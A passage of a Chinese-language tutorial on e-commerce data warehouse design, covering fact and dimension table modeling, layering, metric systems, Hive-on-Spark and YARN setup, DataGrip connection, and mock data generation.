src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/d48645420eb5979f3550dc6589449f50.png" alt="图示 描述已自动生成"></p><p>维度建模以数据分析作为出发点，为数据分析服务，因此它关注的重点的用户如何更快的完成需求分析以及如何实现较好的大规模复杂查询的响应性能。</p><h2 id="第3章-维度建模理论之事实表"><a href="#第3章-维度建模理论之事实表" class="headerlink" title="第3章 维度建模理论之事实表"></a>第3章 维度建模理论之事实表</h2><h3 id="事实表概述"><a href="#事实表概述" class="headerlink" title="事实表概述"></a>事实表概述</h3><p>事实表作为数据仓库维度建模的核心，紧紧围绕着业务过程来设计。其包含与该业务过程有关的维度引用（维度表外键）以及该业务过程的度量（通常是可累加的数字类型字段）。</p><h4 id="事实表特点"><a href="#事实表特点" class="headerlink" title="事实表特点"></a>事实表特点</h4><p>事实表通常比较“细长”，即列较少，但行较多，且行的增速快。</p><h4 id="事实表分类"><a href="#事实表分类" class="headerlink" title="事实表分类"></a>事实表分类</h4><p>事实表有三种类型：分别是事务事实表、周期快照事实表和累积快照事实表，每种事实表都具有不同的特点和适用场景，下面逐个介绍。</p><h3 id="事务型事实表"><a href="#事务型事实表" class="headerlink" title="事务型事实表"></a>事务型事实表</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>事务事实表用来记录各业务过程，它保存的是各业务过程的原子操作事件，即最细粒度的操作事件。粒度是指事实表中一行数据所表达的业务细节程度。</p><p>事务型事实表可用于分析与各业务过程相关的各项统计指标，由于其保存了最细粒度的记录，可以提供最大限度的灵活性，可以支持无法预期的各种细节层次的统计需求。</p><h4 id="设计流程"><a href="#设计流程" class="headerlink" title="设计流程"></a>设计流程</h4><p>设计事务事实表时一般可遵循以下四个步骤：</p><p><strong>选择业务过程→声明粒度→确认维度→确认事实</strong></p><p><strong>1）选择业务过程</strong></p><p>在业务系统中，挑选我们感兴趣的业务过程，业务过程可以概括为一个个不可拆分的行为事件，例如电商交易中的下单，取消订单，付款，退单等，都是业务过程。通常情况下，一个业务过程对应一张事务型事实表。</p><p><strong>2）声明粒度</strong></p><p>业务过程确定后，需要为每个业务过程声明粒度。即精确定义每张事务型事实表的每行数据表示什么，应该尽可能选择最细粒度，以此来应各种细节程度的需求。</p><p><strong>典型的粒度声明如下：</strong></p><p>订单事实表中一行数据表示的是一个订单中的一个商品项。</p><p><strong>3）确定维度</strong></p><p>确定维度具体是指，确定与每张事务型事实表相关的维度有哪些。</p><p>确定维度时应尽量多的选择与业务过程相关的环境信息。因为维度的丰富程度就决定了维度模型能够支持的指标丰富程度。</p><p><strong>4）确定事实</strong></p><p>此处的“事实”一词，指的是每个业务过程的度量值（通常是可累加的数字类型的值，例如：次数、个数、件数、金额等）。</p><p>经过上述四个步骤，事务型事实表就基本设计完成了。第一步选择业务过程可以确定有哪些事务型事实表，第二步可以确定每张事务型事实表的每行数据是什么，第三步可以确定每张事务型事实表的维度外键，第四步可以确定每张事务型事实表的度量值字段。</p><h4 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h4><p>事务型事实表可以保存所有业务过程的最细粒度的操作事件，故理论上其可以支撑与各业务过程相关的各种统计粒度的需求。但对于某些特定类型的需求，其逻辑可能会比较复杂，或者效率会比较低下。例如：</p><p><strong>1）存量型指标</strong></p><p>例如商品库存，账户余额等。此处以电商中的虚拟货币为例，虚拟货币业务包含的业务过程主要包括获取货币和使用货币，两个业务过程各自对应一张事务型事实表，一张存储所有的获取货币的原子操作事件，另一张存储所有使用货币的原子操作事件。</p><p>假定现有一个需求，要求统计截至当日的各用户虚拟货币余额。由于获取货币和使用货币均会影响到余额，故需要对两张事务型事实表进行聚合，且需要区分两者对余额的影响（加或减），另外需要对两张表的全表数据聚合才能得到统计结果。</p><p>可以看到，不论是从逻辑上还是效率上考虑，这都不是一个好的方案。</p><p><strong>2）多事务关联统计</strong></p><p>例如，现需要统计最近30天，用户下单到支付的时间间隔的平均值。统计思路应该是找到下单事务事实表和支付事务事实表，过滤出最近30天的记录，然后按照订单id对两张事实表进行关联，之后用支付时间减去下单时间，然后再求平均值。</p><p>逻辑上虽然并不复杂，但是其效率较低，应为下单事务事实表和支付事务事实表均为大表，大表join大表的操作应尽量避免。</p><p>可以看到，在上述两种场景下事务型事实表的表现并不理想。下面要介绍的另外两种类型的事实表就是为了弥补事务型事实表的不足的。</p><h3 id="周期型快照事实表"><a href="#周期型快照事实表" class="headerlink" title="周期型快照事实表"></a>周期型快照事实表</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>周期快照事实表以具有规律性的、可预见的时间间隔来记录事实，主要用于分析一些存量型（例如商品库存，账户余额）或者状态型（空气温度，行驶速度）指标。</p><p>对于商品库存、账户余额这些存量型指标，业务系统中通常就会计算并保存最新结果，所以定期同步一份全量数据到数据仓库，构建周期型快照事实表，就能轻松应对此类统计需求，而无需再对事务型事实表中大量的历史记录进行聚合了。</p><p>对于空气温度、行驶速度这些状态型指标，由于它们的值往往是连续的，我们无法捕获其变动的原子事务操作，所以无法使用事务型事实表统计此类需求。而只能定期对其进行采样，构建周期型快照事实表。</p><h4 id="设计流程-1"><a href="#设计流程-1" class="headerlink" title="设计流程"></a>设计流程</h4><p><strong>1）确定粒度</strong></p><p>周期型快照事实表的粒度可由采样周期和维度描述，故确定采样周期和维度后即可确定粒度。</p><p>采样周期通常选择每日。</p><p>维度可根据统计指标决定，例如指标为统计每个仓库中每种商品的库存，则可确定维度为仓库和商品。</p><p>确定完采样周期和维度后，即可确定该表粒度为每日-仓库-商品。</p><p><strong>2）确认事实</strong></p><p>事实也可根据统计指标决定，例如指标为统计每个仓库中每种商品的库存，则事实为商品库存。</p><h4 id="事实类型"><a href="#事实类型" class="headerlink" title="事实类型"></a>事实类型</h4><p>此处的事实类型是指度量值的类型，而非事实表的类型。事实（度量值）共分为三类，分别是可加事实，半可加事实和不可加事实。</p><p><strong>1）可加事实</strong></p><p>可加事实是指可以按照与事实表相关的所有维度进行累加，例如事务型事实表中的事实。</p><p><strong>2）半可加事实</strong></p><p>半可加事实是指只能按照与事实表相关的一部分维度进行累加，例如周期型快照事实表中的事实。以上述各仓库中各商品的库存每天快照事实表为例，这张表中的库存事实可以按照仓库或者商品维度进行累加，但是不能按照时间维度进行累加，因为将每天的库存累加起来是没有任何意义的。</p><p><strong>3）不可加事实</strong></p><p>不可加事实是指完全不具备可加性，例如比率型事实。不可加事实通常需要转化为可加事实，例如比率可转化为分子和分母。</p><h3 id="累积型快照事实表"><a href="#累积型快照事实表" class="headerlink" title="累积型快照事实表"></a>累积型快照事实表</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><p>累计快照事实表是基于一个业务流程中的多个关键业务过程联合处理而构建的事实表，如交易流程中的下单、支付、发货、确认收货业务过程。</p><p>累积型快照事实表通常具有多个日期字段，每个日期对应业务流程中的一个关键业务过程（里程碑）。</p><table><thead><tr><th>订单id</th><th>用户id</th><th>下单日期</th><th>支付日期</th><th>发货日期</th><th>确认收货日期</th><th>订单金额</th><th>支付金额</th></tr></thead><tbody><tr><td>1001</td><td>1234</td><td>2020-06-14</td><td>2020-06-15</td><td>2020-06-16</td><td>2020-06-17</td><td>1000</td><td>1000</td></tr></tbody></table><p>累积型快照事实表主要用于分析业务过程（里程碑）之间的时间间隔等需求。例如前文提到的用户下单到支付的平均时间间隔，使用累积型快照事实表进行统计，就能避免两个事务事实表的关联操作，从而变得十分简单高效。</p><h4 id="设计流程-2"><a href="#设计流程-2" class="headerlink" title="设计流程"></a>设计流程</h4><p>累积型快照事实表的设计流程同事务型事实表类似，也可采用以下四个步骤，下面重点描述与事务型事实表的不同之处。</p><p><strong>选择业务过程→声明粒度→确认维度→确认事实。</strong></p><p><strong>1）选择业务过程</strong></p><p>选择一个业务流程中需要关联分析的多个关键业务过程，多个业务过程对应一张累积型快照事实表。</p><p><strong>2）声明粒度</strong></p><p>精确定义每行数据表示的是什么，尽量选择最小粒度。</p><p><strong>3）确认维度</strong></p><p>选择与各业务过程相关的维度，需要注意的是，每各业务过程均需要一个日期维度。</p><p><strong>4）确认事实</strong></p><p>选择各业务过程的度量值。</p><h2 id="第4章-维度建模理论之维度表"><a href="#第4章-维度建模理论之维度表" class="headerlink" title="第4章 维度建模理论之维度表"></a>第4章 维度建模理论之维度表</h2><h3 id="维度表概述"><a href="#维度表概述" class="headerlink" title="维度表概述"></a>维度表概述</h3><p>维度表是维度建模的基础和灵魂。前文提到，事实表紧紧围绕业务过程进行设计，而维度表则围绕业务过程所处的环境进行设计。维度表主要包含一个主键和各种维度字段，维度字段称为维度属性。</p><h3 id="维度表设计步骤"><a href="#维度表设计步骤" class="headerlink" title="维度表设计步骤"></a>维度表设计步骤</h3><p><strong>1）确定维度（表）</strong></p><p>在设计事实表时，已经确定了与每个事实表相关的维度，理论上每个相关维度均需对应一张维度表。需要注意到，可能存在多个事实表与同一个维度都相关的情况，这种情况需保证维度的唯一性，即只创建一张维度表。另外，如果某些维度表的维度属性很少，例如只有一个**名称，则可不创建该维度表，而把该表的维度属性直接增加到与之相关的事实表中，这个操作称为<strong>维度退化</strong>。</p><p><strong>2）确定主维表和相关维表</strong></p><p>此处的主维表和相关维表均指<strong>业务系统</strong>中与某维度相关的表。例如业务系统中与商品相关的表有sku_info，spu_info，base_trademark，base_category3，base_category2，base_category1等，其中sku_info就称为商品维度的主维表，其余表称为商品维度的相关维表。维度表的粒度通常与主维表相同。</p><p><strong>3）确定维度属性</strong></p><p>确定维度属性即确定维度表字段。维度属性主要来自于业务系统中与该维度对应的主维表和相关维表。维度属性可直接从主维表或相关维表中选择，也可通过进一步加工得到。</p><p>确定维度属性时，需要遵循以下要求：</p><p><strong>（1）尽可能生成丰富的维度属性</strong></p><p>维度属性是后续做分析统计时的查询约束条件、分组字段的基本来源，是数据易用性的关键。维度属性的丰富程度直接影响到数据模型能够支持的指标的丰富程度。</p><p><strong>（2）尽量不使用编码，而使用明确的文字说明，一般可以编码和文字共存。</strong></p><p><strong>（3）尽量沉淀出通用的维度属性</strong></p><p>有些维度属性的获取需要进行比较复杂的逻辑处理，例如需要通过多个字段拼接得到。为避免后续每次使用时的重复处理，可将这些维度属性沉淀到维度表中。</p><h3 id="维度设计要点"><a href="#维度设计要点" class="headerlink" title="维度设计要点"></a>维度设计要点</h3><h4 id="规范化与反规范化"><a href="#规范化与反规范化" class="headerlink" title="规范化与反规范化"></a>规范化与反规范化</h4><p><strong>规范化</strong>是指使用一系列范式设计数据库的过程，其目的是减少数据冗余，增强数据的一致性。通常情况下，规范化之后，一张表的字段会拆分到多张表。</p><p><strong>反规范化</strong>是指将多张表的数据冗余到一张表，其目的是减少join操作，提高查询性能。</p><p>在设计维度表时，如果对其进行规范化，得到的维度模型称为雪花模型，如果对其进行反规范化，得到的模型称为星型模型。</p><p>数据仓库系统的主要目的是用于数据分析和统计，所以是否方便用户进行统计分析决定了模型的优劣。采用雪花模型，用户在统计分析的过程中需要大量的关联操作，使用复杂度高，同时查询性能很差，而采用星型模型，则方便、易用且性能好。所以出于易用性和性能的考虑，维度表一般是很不规范化的。</p><h4 id="维度变化"><a href="#维度变化" class="headerlink" title="维度变化"></a>维度变化</h4><p>维度属性通常不是静态的，而是会随时间变化的，数据仓库的一个重要特点就是反映历史的变化，所以如何保存维度的历史状态是维度设计的重要工作之一。保存维度数据的历史状态，通常有以下两种做法，分别是全量快照表和拉链表。</p><p><strong>1）全量快照表</strong></p><p>离线数据仓库的计算周期通常为每天一次，所以可以每天保存一份全量的维度数据。这种方式的优点和缺点都很明显。</p><p>优点是简单而有效，开发和维护成本低，且方便理解和使用。</p><p>缺点是浪费存储空间，尤其是当数据的变化比例比较低时。</p><p><strong>2）拉链表</strong></p><p>拉链表的意义就在于能够更加高效的保存维度信息的历史状态。</p><p><strong>（1）什么是拉链表</strong></p><p><strong>（2）为什么要做拉链表</strong></p><p><strong>（3）如何使用拉链表</strong></p><h4 id="多值维度"><a href="#多值维度" class="headerlink" title="多值维度"></a>多值维度</h4><p>如果事实表中一条记录在某个维度表中有多条记录与之对应，称为多值维度。例如，下单事实表中的一条记录为一个订单，一个订单可能包含多个商品，所会商品维度表中就可能有多条数据与之对应。</p><p>针对这种情况，通常采用以下两种方案解决。</p><p>第一种：降低事实表的粒度，例如将订单事实表的粒度由一个订单降低为一个订单中的一个商品项。</p><p>第二种：在事实表中采用多字段保存多个维度值，每个字段保存一个维度id。这种方案只适用于多值维度个数固定的情况。</p><p>建议尽量采用第一种方案解决多值维度问题。</p><h4 id="多值属性"><a href="#多值属性" class="headerlink" title="多值属性"></a>多值属性</h4><p>维表中的某个属性同时有多个值，称之为“多值属性”，例如商品维度的平台属性和销售属性，每个商品均有多个属性值。</p><p>针对这种情况，通常有可以采用以下两种方案。</p><p>第一种：将多值属性放到一个字段，该字段内容为key1:value1，key2:value2的形式，例如一个手机商品的平台属性值为“品牌:华为，系统:鸿蒙，CPU:麒麟990”。</p><p>第二种：将多值属性放到多个字段，每个字段对应一个属性。这种方案只适用于多值属性个数固定的情况。</p><h2 id="第5章-数据仓库设计"><a href="#第5章-数据仓库设计" class="headerlink" title="第5章 数据仓库设计"></a>第5章 数据仓库设计</h2><h3 id="数据仓库分层规划"><a href="#数据仓库分层规划" class="headerlink" title="数据仓库分层规划"></a>数据仓库分层规划</h3><p>优秀可靠的数仓体系，需要良好的数据分层结构。合理的分层，能够使数据体系更加清晰，使复杂问题得以简化。以下是该项目的分层规划。</p><h3 id="数据仓库构建流程"><a href="#数据仓库构建流程" class="headerlink" title="数据仓库构建流程"></a>数据仓库构建流程</h3><p>以下是构建数据仓库的完整流程。</p><h4 id="数据调研"><a href="#数据调研" class="headerlink" title="数据调研"></a>数据调研</h4><p>数据调研重点要做两项工作，分别是业务调研和需求分析。这两项工作做的是否充分，直接影响着数据仓库的质量。</p><p><strong>1）业务调研</strong></p><p>业务调研的主要目标是<strong>熟悉业务流程</strong>、<strong>熟悉业务数据</strong>。</p><p><strong>熟悉业务流程</strong>要求做到，明确每个业务的具体流程，需要将该业务所包含的每个<strong>业务过程</strong>一一列举出来。</p><p><strong>熟悉业务数据</strong>要求做到，将数据（包括埋点日志和业务数据表）与业务过程对应起来，明确每个业务过程会对哪些表的数据产生影响，以及产生什么影响。产生的影响，需要具体到，是新增一条数据，还是修改一条数据，并且需要明确新增的内容或者是修改的逻辑。</p><p>下面业务电商中的交易为例进行演示，交易业务涉及到的业务过程有买家下单、买家支付、卖家发货，买家收货，具体流程如下图。</p><p><strong>2）需求分析</strong></p><p>典型的需求指标如，最近一天各省份手机品类订单总额。</p><p>分析需求时，需要明确需求所需的<strong>业务过程</strong>及<strong>维度</strong>，例如该需求所需的业务过程就是买家下单，所需的维度有日期，省份，商品品类。</p><p><strong>3）总结</strong></p><p>做完业务分析和需求分析之后，要保证每个需求都能找到与之对应的业务过程及维度。若现有数据无法满足需求，则需要和业务方进行沟通，例如某个页面需要新增某个行为的埋点。</p><h4 id="明确数据域"><a href="#明确数据域" class="headerlink" title="明确数据域"></a>明确数据域</h4><p>数据仓库模型设计除横向的分层外，通常也需要根据业务情况进行纵向划分数据域。</p><p>划分数据域的意义是<strong>便于数据的管理和应用</strong>。</p><p>通常可以根据业务过程或者部门进行划分，本项目根据业务过程进行划分，需要注意的是一个业务过程只能属于一个数据域。</p><p>下面是本数仓项目所需的所有业务过程及数据域划分详情。</p><table><thead><tr><th>数据域</th><th>业务过程</th></tr></thead><tbody><tr><td>交易域</td><td>加购、下单、取消订单、支付成功、退单、退款成功</td></tr><tr><td>流量域</td><td>页面浏览、启动应用、动作、曝光、错误</td></tr><tr><td>用户域</td><td>注册、登录</td></tr><tr><td>互动域</td><td>收藏、评价</td></tr><tr><td>工具域</td><td>优惠券领取、优惠券使用（下单）、优惠券使用（支付）</td></tr></tbody></table><h4 id="构建业务总线矩阵"><a href="#构建业务总线矩阵" class="headerlink" title="构建业务总线矩阵"></a>构建业务总线矩阵</h4><p>业务总线矩阵中包含维度模型所需的所有事实（业务过程）以及维度，以及各业务过程与各维度的关系。矩阵的行是一个个业务过程，矩阵的列是一个个的维度，行列的交点表示业务过程与维度的关系。</p><p>一个业务过程对应维度模型中一张事务型事实表，一个维度则对应维度模型中的一张维度表。所以构建业务总线矩阵的过程就是设计维度模型的过程。但是需要注意的是，总线矩阵中通常只包含事务型事实表，另外两种类型的事实表需单独设计。</p><p>按照事务型事实表的设计流程，<strong>选择业务过程声明粒度确认维度确认事实</strong>，得到的最终的业务总线矩阵见以下表格。</p><p>后续的DWD层以及DIM层的搭建需参考业务总线矩阵。</p><h4 id="明确统计指标"><a href="#明确统计指标" class="headerlink" title="明确统计指标"></a>明确统计指标</h4><p>明确统计指标具体的工作是，深入分析需求，构建指标体系。构建指标体系的主要意义就是指标定义标准化。所有指标的定义，都必须遵循同一套标准，这样能有效的避免指标定义存在歧义，指标定义重复等问题。</p><p><strong>1）指标体系相关概念</strong></p><p><strong>（1）原子指标</strong></p><p>原子指标基于某一<strong>业务过程</strong>的<strong>度量值</strong>，是业务定义中不可再拆解的指标，原子指标的核心功能就是对指标的<strong>聚合逻辑</strong>进行了定义。我们可以得出结论，原子指标包含三要素，分别是业务过程、度量值和聚合逻辑。</p><p>例如<strong>订单总额</strong>就是一个典型的原子指标，其中的业务过程为用户下单、度量值为订单金额，聚合逻辑为sum()求和。需要注意的是原子指标只是用来辅助定义指标一个概念，通常不会对应有实际统计需求与之对应。</p><p><strong>（2）派生指标</strong></p><p>派生指标基于原子指标，其与原子指标的关系如下图所示。</p><p>与原子指标不同，派生指标通常会对应实际的统计需求。请从图中的例子中，体会指标定义标准化的含义。</p><p><strong>（3）衍生指标</strong></p><p>衍生指标是在一个或多个派生指标的基础上，通过各种逻辑运算复合而成的。例如比率、比例等类型的指标。衍生指标也会对应实际的统计需求。</p><p><strong>2）指标体系对于数仓建模的意义</strong></p><p>通过上述两个具体的案例可以看出，绝大多数的统计需求，都可以使用原子指标、派生指标以及衍生指标这套标准去定义。同时能够发现这些统计需求都直接的或间接的对应一个或者是多个派生指标。</p><p>当统计需求足够多时，必然会出现部分统计需求对应的派生指标相同的情况。这种情况下，我们就可以考虑将这些公共的派生指标保存下来，这样做的主要目的就是减少重复计算，提高数据的复用性。</p><p>这些公共的派生指标统一保存在数据仓库的DWS层。因此DWS层设计，就可以参考我们根据现有的统计需求整理出的派生指标。</p><p>按照上述标准整理出的指标体系如下：</p><p>（1）思维导图版</p><p>（2）PDF版</p><p>从上述指标体系中抽取出来的所有派生指标见如下表格。</p><h4 id="维度模型设计"><a href="#维度模型设计" class="headerlink" title="维度模型设计"></a>维度模型设计</h4><p>维度模型的设计参照上述得到的业务总线矩阵即可。事实表存储在DWD层，维度表存储在DIM层。</p><h4 id="汇总模型设计"><a href="#汇总模型设计" class="headerlink" title="汇总模型设计"></a>汇总模型设计</h4><p>汇总模型的设计参考上述整理出的指标体系（主要是派生指标）即可。汇总表与派生指标的对应关系是，<strong>一张汇总</strong>表通常<strong>包含</strong>业务过程相同、统计周期相同、统计粒度相同的<strong>多个派生指标</strong>。请思考：汇总表与事实表的对应关系是？</p><h2 id="第6章-数据仓库环境准备"><a href="#第6章-数据仓库环境准备" class="headerlink" title="第6章 数据仓库环境准备"></a>第6章 数据仓库环境准备</h2><h3 id="数据仓库运行环境"><a href="#数据仓库运行环境" class="headerlink" title="数据仓库运行环境"></a>数据仓库运行环境</h3><h4 id="Hive环境搭建"><a href="#Hive环境搭建" class="headerlink" title="Hive环境搭建"></a>Hive环境搭建</h4><p><strong>1）Hive引擎简介</strong></p><p>Hive引擎包括：默认MR、tez、spark</p><p>Hive on<br>Spark：Hive既作为存储元数据又负责SQL的解析优化，语法是HQL语法，执行引擎变成了Spark，Spark负责采用RDD执行。</p><p>Spark on Hive : Hive只作为存储元数据，Spark负责SQL解析优化，语法是Spark<br>SQL语法，Spark负责采用RDD执行。</p><p><strong>2）Hive on Spark配置</strong></p><p><strong>（1）兼容性说明</strong></p><p>注意：官网下载的Hive3.1.2和Spark3.0.0默认是不兼容的。因为Hive3.1.2支持的Spark版本是2.4.5，所以需要我们重新编译Hive3.1.2版本。</p><p>编译步骤：官网下载Hive3.1.2源码，修改pom文件中引用的Spark版本为3.0.0，如果编译通过，直接打包获取jar包。如果报错，就根据提示，修改相关方法，直到不报错，打包获取jar包。</p><p><strong>（2）在Hive所在节点部署Spark</strong></p><p>如果之前已经部署了Spark，则该步骤可以跳过</p><p>Spark官网下载jar包地址：</p><p><a href="http://spark.apache.org/downloads.html">http://spark.apache.org/downloads.html</a></p><p>上传并解压解压spark-3.0.0-bin-hadoop3.2.tgz</p><p>[atguigu@hadoop102 software]$ tar -zxvf spark-3.0.0-bin-hadoop3.2.tgz -C<br>/opt/module/</p><p>[atguigu@hadoop102 software]$ mv /opt/module/spark-3.0.0-bin-hadoop3.2<br>/opt/module/spark</p><p><strong>（3）配置SPARK_HOME环境变量</strong></p><p>[atguigu@hadoop102 software]$ sudo vim /etc/profile.d/my_env.sh</p><p>添加如下内容</p><p>## SPARK_HOME</p><p>export SPARK_HOME=/opt/module/spark</p><p>export PATH=$PATH:$SPARK_HOME/bin</p><p>source 使其生效</p><p>[atguigu@hadoop102 software]$ source /etc/profile.d/my_env.sh</p><p><strong>（4）在hive中创建spark配置文件</strong></p><p>[atguigu@hadoop102 software]$ vim /opt/module/hive/conf/spark-defaults.conf</p><p>添加如下内容（在执行任务时，会根据如下参数执行）</p><p>spark.master yarn</p><p>spark.eventLog.enabled true</p><p>spark.eventLog.dir hdfs://hadoop102:8020/spark-history</p><p>spark.executor.memory 1g</p><p>spark.driver.memory 1g</p><p>在HDFS创建如下路径，用于存储历史日志</p><p>[atguigu@hadoop102 software]$ hadoop fs -mkdir /spark-history</p><p><strong>（5）向HDFS上传Spark纯净版jar包</strong></p><p>说明1：由于Spark3.0.0非纯净版默认支持的是hive2.3.7版本，直接使用会和安装的Hive3.1.2出现兼容性问题。所以采用Spark纯净版jar包，不包含hadoop和hive相关依赖，避免冲突。</p><p>说明2：Hive任务最终由Spark来执行，Spark任务资源分配由Yarn来调度，该任务有可能被分配到集群的任何一个节点。所以需要将Spark的依赖上传到HDFS集群路径，这样集群中任何一个节点都能获取到。</p><p>上传并解压spark-3.0.0-bin-without-hadoop.tgz</p><p>[atguigu@hadoop102 software]$ tar -zxvf<br>/opt/software/spark-3.0.0-bin-without-hadoop.tgz</p><p>上传Spark纯净版jar包到HDFS</p><p>[atguigu@hadoop102 software]$ hadoop fs -mkdir /spark-jars</p><p>[atguigu@hadoop102 software]$ hadoop fs -put<br>spark-3.0.0-bin-without-hadoop/jars/* /spark-jars</p><p><strong>（6）修改hive-site.xml文件</strong></p><p>[atguigu@hadoop102 ~]$ vim /opt/module/hive/conf/hive-site.xml</p><p>添加如下内容</p><p>&lt;!–Spark依赖位置（注意：端口号8020必须和namenode的端口号一致）–&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;spark.yarn.jars&lt;/name&gt;</p><p>&lt;value&gt;hdfs://hadoop102:8020/spark-jars/*&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;!–Hive执行引擎–&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.execution.engine&lt;/name&gt;</p><p>&lt;value&gt;spark&lt;/value&gt;</p><p>&lt;/property&gt;</p><p><strong>3）Hive on Spark测试</strong></p><p>（1）启动hive客户端</p><p>[atguigu@hadoop102 hive]$ bin/hive</p><p>（2）创建一张测试表</p><p>hive (default)&gt; create table student(id int, name string);</p><p>（3）通过insert测试效果</p><p>hive (default)&gt; insert into table student values(1,’abc’);</p><p>若结果如下，则说明配置成功</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/bce7a0b2e183b0457f5cdde8c162d748.png" alt="日程表 中度可信度描述已自动生成"></p><h4 id="Yarn环境配置"><a href="#Yarn环境配置" class="headerlink" title="Yarn环境配置"></a>Yarn环境配置</h4><p><strong>1）增加ApplicationMaster资源比例</strong></p><p>容量调度器对每个资源队列中同时运行的Application<br>Master占用的资源进行了限制，该限制通过yarn.scheduler.capacity.maximum-am-resource-percent参数实现，其默认值是0.1，表示每个资源队列上Application<br>Master最多可使用的资源为该队列总资源的10%，目的是防止大部分资源都被Application<br>Master占用，而导致Map/Reduce Task无法执行。</p><p>生产环境该参数可使用默认值。但学习环境，集群资源总数很少，如果只分配10%的资源给Application<br>Master，则可能出现，同一时刻只能运行一个Job的情况，因为一个Application<br>Master使用的资源就可能已经达到10%的上限了。故此处可将该值适当调大。</p><p>（1）在hadoop102的/opt/module/hadoop-3.1.3/etc/hadoop/capacity-scheduler.xml文件中<strong>修改</strong>如下参数值</p><p>[atguigu@hadoop102 hadoop]$ vim capacity-scheduler.xml</p><p>&lt;property&gt;</p><p>&lt;name&gt;yarn.scheduler.capacity.maximum-am-resource-percent&lt;/name&gt;</p><p>&lt;value&gt;0.8&lt;/value&gt;</p><p>&lt;/property</p><p>（2）分发capacity-scheduler.xml配置文件</p><p>[atguigu@hadoop102 hadoop]$ xsync capacity-scheduler.xml</p><p>（3）关闭正在运行的任务，重新启动yarn集群</p><p>[atguigu@hadoop103 hadoop-3.1.3]$ sbin/stop-yarn.sh</p><p>[atguigu@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh</p><h3 id="数据仓库开发环境"><a href="#数据仓库开发环境" class="headerlink" title="数据仓库开发环境"></a>数据仓库开发环境</h3><p>数仓开发工具可选用DBeaver或者DataGrip。两者都需要用到JDBC协议连接到Hive，故需要启动HiveServer2。</p><p><strong>1）启动HiveServer2</strong></p><p>[atguigu@hadoop102 hive]$ hiveserver2</p><p><strong>2）配置DataGrip连接</strong></p><p><strong>（1）创建连接</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/2c4f63c096e1079aa93cfc2317b65f36.png" alt="图形用户界面, 文本, 应用程序, 电子邮件描述已自动生成"></p><p><strong>（2）配置连接属性</strong></p><p>所有属性配置，和Hive的beeline客户端配置一致即可。初次使用，配置过程会提示缺少JDBC驱动，按照提示下载即可。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/8abb9efbe0512cd0f64fabdaaa697e1d.png" alt="图形用户界面, 应用程序, 电子邮件描述已自动生成"></p><p><strong>3）测试使用</strong></p><p><strong>创建数据库gmall，并观察是否创建成功。</strong></p><p><strong>（1）创建数据库</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/776073b0a8029c742544c71c93991b7d.png" alt="图形用户界面, 文本, 应用程序描述已自动生成"></p><p><strong>（2）查看数据库</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/fa877779fb43f2aa89a925ddbe79f537.png" alt="图形用户界面, 应用程序, Word描述已自动生成"></p><p><strong>（3）修改连接，指明连接数据库</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/9fea377dcc34e3844f0d14dae5db060e.png" alt="图形用户界面, 文本, 应用程序, 电子邮件描述已自动生成"></p><p><strong>（4）选择当前数据库为gmall</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/5e6b5bfea4448d2ea28ef971eeaadaee.png" alt="图形用户界面, 应用程序描述已自动生成"></p><h3 id="模拟数据准备"><a href="#模拟数据准备" class="headerlink" title="模拟数据准备"></a>模拟数据准备</h3><p>通常企业在开始搭建数仓时，业务系统中会存在历史数据，一般是业务数据库存在历史数据，而用户行为日志无历史数据。假定数仓上线的日期为2020-06-14，为模拟真实场景，需准备以下数据。</p><p>注：在执行以下操作之前，先将HDFS上/origin_data路径下之前的数据删除。</p><p><strong>1）用户行为日志</strong></p><p>用户行为日志，一般是没有历史数据的，故日志只需要准备2020-06-14一天的数据。具体操作如下：</p><p>（1）启动日志采集通道，包括Flume、Kafak等</p><p>（2）修改两个日志服务器（hadoop102、hadoop103）中的</p><p>/opt/module/applog/application.yml配置文件，将mock.date参数改为2020-06-14。</p><p>（3）执行日志生成脚本lg.sh。</p><p>（4）观察HDFS是否出现相应文件。</p><p><strong>2）业务数据</strong></p><p>业务数据一般存在历史数据，此处需准备2020-06-10至2020-06-14的数据。具体操作如下。</p><p><strong>（1）生成模拟数据</strong></p><p>修改hadoop102节点上的/opt/module/db_log/application.properties文件，将mock.date、mock.clear，mock.clear.user三个参数调整为如图所示的值。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/928174bb07164efac9511dbf482a878f.png" alt="文本 描述已自动生成"></p><p>执行模拟生成业务数据的命令，生成第一天2020-06-10的历史数据。</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-01-22.jar</p><p>修改/opt/module/db_log/application.properties文件，将mock.date、mock.clear，mock.clear.user三个参数调整为如图所示的值。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/10f27d1b2dceed818de8b1a8b4de20fa.png" alt="文本 描述已自动生成"></p><p>执行模拟生成业务数据的命令，生成第二天2020-06-11的历史数据。</p><p>[atguigu@hadoop102 db_log]$ java -jar 